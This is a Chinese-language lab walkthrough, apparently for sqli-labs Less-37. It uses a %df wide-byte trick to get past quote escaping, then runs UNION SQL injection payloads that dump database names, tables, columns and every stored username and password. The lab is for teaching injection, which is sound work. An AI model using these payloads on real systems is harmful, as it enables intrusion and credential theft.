---
title: Less - 37
date: 2023-03-20T18:11:37Z
lastmod: 2023-03-20T18:26:46Z
---

# Less - 37

---

# 通关教程

---

## 1、判断闭合方式

---

```http
uname=admin'&passwd=admin&submit=Submit
```

​![image](assets/image-20230320181304-nrrfekc.png)​

```http
uname=admin&passwd=admin'&submit=Submit
```

​![image](assets/image-20230320181339-9nudtox.png)​

用户名和密码的位置单引号都被转义，直接查看源代码查看是否为GBK编码

​![image](assets/image-20230320181511-c6u0ruk.png)​

确实使用了GBK编码，在单引号前面加入%df让单引号成功逃逸

---

## 2、查看当前库

---

```http
uname=a%df' union select 1,database()#&passwd=admin&submit=Submit
```

​![image](assets/image-20230320181936-i2il4qi.png)​

---

## 3、查看security库下的所有表

---

```http
uname=a%df' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())#&passwd=admin&submit=Submit
```

​![image](assets/image-20230320182036-42gn8b0.png)​

---

## 4、查看users表下的所有字段

---

```http
uname=a%df' union select 1,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273)#&passwd=admin&submit=Submit
```

​![image](assets/image-20230320182208-vqy0vz8.png)​

---

## 5、查看username,password字段下的所有值

---

```http
uname=a%df' union select 1,(select group_concat(username,password) from security.users)#&passwd=admin&submit=Submit
```

​![image](assets/image-20230320182644-nd6naiz.png)​

‍
